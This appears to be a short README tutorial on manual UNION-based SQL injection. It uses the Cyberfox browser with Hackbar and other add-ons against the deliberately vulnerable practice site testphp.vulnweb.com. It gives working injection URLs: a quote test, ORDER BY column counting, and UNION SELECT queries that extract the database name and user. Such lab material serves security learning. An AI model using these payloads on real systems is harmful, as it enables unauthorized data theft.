# sqlinjection-hackbar-cyberfox

Pre-requisite:
1. Cyberfox Browser - (Linux/Windows).<br>
    To install cyberfox on linux using .deb <pre>dpkg -i <packagename>.deb</pre>
2. Hackbar v2.9.xpi
3. noredirect-1.3.2.13-fx+sm.xpi
4. tamper-data.xpi


Open the target page:
<pre>http://testphp.vulnweb.com/listproducts.php?cat=1</pre>

Test for SQL injection vulnerability by adding ' in the last:
<pre>http://testphp.vulnweb.com/listproducts.php?cat=1'</pre>

If you see an SQL error like:
<pre>You have an error in your SQL syntax</pre>
it means the parameter is likely vulnerable to SQL injection.

Exploit SQL Injection (UNION-Based)
<pre>http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 3--</pre>
If the page works fine, try increasing the number: ORDER BY 4--, ORDER BY 5--…
When you get an error, go back to the last number that worked. That’s your number of columns.

Once you know the number of columns, say 3, try:
<pre>http://testphp.vulnweb.com/listproducts.php?cat=-1 UNION SELECT 1,2,3--</pre>
You’ll see values like 1, 2, 3 appear on the page — it confirms the injection.

You can now extract useful data like:
<pre>http://testphp.vulnweb.com/listproducts.php?cat=-1 UNION SELECT 1, database(), user()--</pre>


